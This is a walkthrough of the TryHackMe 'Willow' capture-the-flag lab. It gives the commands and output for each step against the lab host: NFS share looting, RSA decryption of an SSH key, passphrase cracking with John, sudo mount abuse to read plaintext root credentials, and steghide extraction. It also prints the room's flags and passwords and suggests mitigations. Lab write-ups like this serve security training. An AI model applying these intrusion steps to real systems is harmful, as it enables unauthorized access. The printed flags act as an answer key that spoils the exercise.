# Willow CTF Walkthrough

**Target:** Willow  
**Source:** [TryHackMe](https://tryhackme.com/room/willow)  
**Difficulty:** Medium  
**Target IP:** 10.114.175.172

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Recovery Page & Hex Decoding](#web-recovery-page--hex-decoding)
- [NFS Enumeration & RSA Key Pair](#nfs-enumeration--rsa-key-pair)
- [RSA Decryption of the Private Key](#rsa-decryption-of-the-private-key)
- [Cracking the Key Passphrase](#cracking-the-key-passphrase)
- [Initial Foothold via SSH](#initial-foothold-via-ssh)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Willow is a medium-difficulty Linux box themed around the willow tree and folk
poetry. The objective is to read both the user and root flags. The attack chain
threads several puzzle-style stages: a "Recovery Page" web server serves a
hex-encoded message that decodes to a note plus an RSA-encrypted blob, an
exposed **NFS** export leaks the RSA key parameters needed to decrypt it, the
recovered encrypted SSH private key is cracked with John to obtain its
passphrase, and SSH access as `willow` follows. Privilege escalation abuses a
permissive `sudo` rule allowing `mount` of any `/dev/*` device, which exposes a
hidden backup partition containing plaintext root credentials. The flags
themselves are hidden with steganography, making the final flag dependent on a
recovered password.

**Key Skills Required:**
- Network scanning and service enumeration
- Hex decoding of web content (`xxd`)
- NFS enumeration and mounting (`showmount`, `mount -t nfs`)
- RSA decryption using leaked key parameters
- Cracking encrypted SSH keys (`ssh2john` + John the Ripper)
- Sudo misconfiguration abuse (`mount /dev/*`)
- Steganography extraction (`steghide`) to recover hidden flags

---

## Reconnaissance

### Network Scanning

A full service/OS scan reveals SSH, a web server, and an NFS stack:

```bash
nmap -sV -sC -sS -A 10.114.175.172
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 6.7p1 Debian |
| 80/tcp | http | Apache httpd 2.4.10 (Debian) — "Recovery Page" |
| 111/tcp | rpcbind | 2-4 (RPC #100000) |
| 2049/tcp | nfs | 2-4 (RPC #100003) |

The web title is "Recovery Page", and the RPC/NFS services (111 + 2049) are a
strong hint that a network share will play a role.

---

## Web Recovery Page & Hex Decoding

Fetching the page and converting it to text exposes a long hex string:

```bash
curl -s http://10.114.175.172 | html2text > willow.txt
```

Reversing the hex to its raw form reveals the underlying content:

```bash
cat willow.txt | xxd -r -p > willow_d.txt
cat willow_d.txt
```

```
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 ... (long list of numbers)
```

So the page hands over an **RSA-encrypted** SSH private key (the block of
numbers) plus a hint that the decryption key lives elsewhere — pointing at the
NFS share.

---

## NFS Enumeration & RSA Key Pair

Listing the NFS exports shows one share:

```bash
showmount -e 10.114.175.172
Export list for 10.114.175.172:
/var/failsafe *
```

Mount it locally and inspect the contents:

```bash
mkdir /tmp/willow
sudo mount -t nfs 10.114.175.172:/var/failsafe /tmp/willow
cat /tmp/willow/rsa_keys
```

```
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

This gives the full RSA parameter set:

- `e = 23`
- `n = 37627`
- `d = 61527`

> **Recovered RSA key:** public `(e=23, n=37627)`, private `(d=61527, n=37627)`

---

## RSA Decryption of the Private Key

Using the modulus and private exponent, the numeric ciphertext from
`willow_d.txt` is decrypted (each number raised to `d` mod `n`), producing ASCII
codes. Converting those codes to text reconstructs the encrypted SSH private
key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
... (truncated) ...
-----END RSA PRIVATE KEY-----
```

Save the decrypted key to a file:

```bash
echo "-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----" > id_rsa
```

The `Proc-Type: 4,ENCRYPTED` header shows the key itself is still passphrase
protected (AES-128-CBC), so it must be cracked before use.

---

## Cracking the Key Passphrase

Convert the encrypted key to a John-compatible hash and crack it:

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
wildflower       (id_rsa)
1g 0:00:00:00 DONE ...
```

> **Recovered passphrase:** `wildflower`

---

## Initial Foothold via SSH

Lock down the key permissions and log in. Because the key uses the legacy
ssh-rsa type, the connection options must allow it:

```bash
chmod 600 id_rsa
ssh -i id_rsa willow@10.114.175.172 -o PubkeyAcceptedKeyTypes=+ssh-rsa
Enter passphrase for key 'id_rsa': wildflower
```

The login banner quotes *The Willow Tree* folk song, and a shell as `willow`
lands:

```bash
willow@willow-tree:~$ whoami
willow
```

> **Foothold:** `willow`

---

## User Flag

The user's home contains `user.jpg`. The flag is recovered from the room (the
JPEG is pulled to the attacker machine for analysis):

```bash
scp -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  willow@10.114.175.172:/home/willow/user.jpg .
```

> **User flag:** `THM{beneath_th_weeping_willow_tree}`

---

## Privilege Escalation

Checking `willow`'s sudo rights reveals a dangerously broad rule:

```bash
willow@willow-tree:~$ sudo -l
User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

`willow` can mount any `/dev/*` device as root without a password. Listing
`/dev` reveals a suspicious block device:

```bash
willow@willow-tree:~$ ls -l /dev
...
brw-rw---- 1 root disk 202, 5 Jun 24 19:44 hidden_backup
...
```

Mounting `hidden_backup` exposes a credentials file owned by root:

```bash
willow@willow-tree:~$ mkdir /home/willow/bcp
willow@willow-tree:~$ sudo mount /dev/hidden_backup /home/willow/bcp/
willow@willow-tree:~$ cat /home/willow/bcp/creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

> **Recovered credentials:** `root : 7QvbvBTvwPspUK`

Switch to root with the recovered password:

```bash
willow@willow-tree:~/bcp$ su root
Password: 7QvbvBTvwPspUK
root@willow-tree:/home/willow/bcp# whoami
root
```

> **Privilege escalation:** `willow` → `root`

---

## Root Flag

Reading `/root/root.txt` reveals the room's twist — the root flag was never
there. The actual flag is hidden in `user.jpg` using the root password as the
steganography passphrase:

```bash
root@willow-tree:~# cat /root/root.txt
This would be too easy, don't you think? I actually gave you the root flag
some time ago. You've got my password now -- go find your flag!
```

Extract the flag from `user.jpg` on the attacker machine, using the root
password as the passphrase:

```bash
steghide extract -sf user.jpg
Enter passphrase: 7QvbvBTvwPspUK
wrote extracted data to "root.txt".

cat root.txt
THM{find_a_red_rose_on_the_grave}
```

> **Root flag:** `THM{find_a_red_rose_on_the_grave}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{beneath_th_weeping_willow_tree}` | `/home/willow/user.jpg` (room) |
| Root flag | `THM{find_a_red_rose_on_the_grave}` | `user.jpg` (steghide, passphrase = root password) |

---

## Vulnerabilities

### 1. Sensitive Data Exposed via Web Recovery Page (Medium)

**Description:** The web server served a hex-encoded note and an RSA-encrypted
SSH private key to any unauthenticated visitor.

**Impact:** Information disclosure providing the encrypted key material needed
for the entire chain.

**Mitigation:**
- Do not expose key material — even encrypted — on public web pages.
- Require authentication for any recovery/backup interface.

### 2. Unauthenticated NFS Export (High)

**Description:** The `/var/failsafe` NFS share was exported to everyone (`*`)
without authentication and contained the RSA key parameters.

**Impact:** Leaked the decryption key pair, enabling recovery of the SSH private
key.

**Mitigation:**
- Restrict NFS exports to specific trusted hosts and authenticated users.
- Never store key material or secrets on open shares.

### 3. Weak Passphrase on Encrypted SSH Key (High)

**Description:** The encrypted SSH private key used a passphrase (`wildflower`)
present in `rockyou.txt`, crackable in seconds with John.

**Impact:** Initial foothold as `willow`.

**Mitigation:**
- Use long, random passphrases for private keys.
- Protect key files and rotate exposed keys immediately.

### 4. Overly Permissive sudo mount Rule (Critical)

**Description:** `willow` could run `sudo /bin/mount /dev/*` with `NOPASSWD`,
allowing any block device — including a hidden root-owned backup — to be mounted
and read.

**Impact:** Disclosure of plaintext root credentials and full privilege
escalation.

**Mitigation:**
- Avoid wildcard `sudo` rules; scope `mount` to specific, intended devices.
- Apply least privilege and audit `sudoers` entries.

### 5. Plaintext Credentials on Backup Partition (Critical)

**Description:** A hidden backup device stored `root` and `willow` passwords in
plaintext in `creds.txt`.

**Impact:** Direct `su` to root; the recovered password also unlocked the
steganographic root flag.

**Mitigation:**
- Never store plaintext credentials, especially on accessible devices.
- Use a secrets manager and encrypt backups.

---

## Attack Chain Summary

```
Nmap scan → SSH, HTTP (Recovery Page), rpcbind, NFS
    ↓
curl + html2text → willow.txt → xxd -r -p → note + RSA ciphertext
    ↓
showmount -e → /var/failsafe → mount NFS → rsa_keys (e,n,d)
    ↓
RSA decrypt ciphertext → encrypted SSH private key
    ↓
ssh2john + john → passphrase: wildflower
    ↓
ssh -i id_rsa willow → foothold
    ↓
User flag: THM{beneath_th_weeping_willow_tree}
    ↓
sudo -l → (ALL) NOPASSWD: /bin/mount /dev/*
    ↓
mount /dev/hidden_backup → creds.txt → root : 7QvbvBTvwPspUK
    ↓
su root → root
    ↓
/root/root.txt → "go find your flag" → steghide user.jpg (root pass)
    ↓
Root flag: THM{find_a_red_rose_on_the_grave}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| cURL / html2text | Fetching and converting the Recovery Page |
| xxd | Hex decoding the web content |
| showmount / mount | NFS enumeration and mounting |
| RSA decryption (manual / online tool) | Recovering the SSH private key |
| ssh2john / John the Ripper | Cracking the key passphrase |
| ssh / scp | Foothold and file transfer |
| steghide | Extracting hidden flags from user.jpg |

---

## References

- [TryHackMe — Willow](https://tryhackme.com/room/willow)
- [Nmap](https://nmap.org/)
- [NFS / showmount](https://linux.die.net/man/8/showmount)
- [John the Ripper](https://www.openwall.com/john/)
- [steghide](https://steghide.sourceforge.net/)
- [RSA Algorithm](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [GTFOBins — mount](https://gtfobins.org/gtfobins/mount/)

---
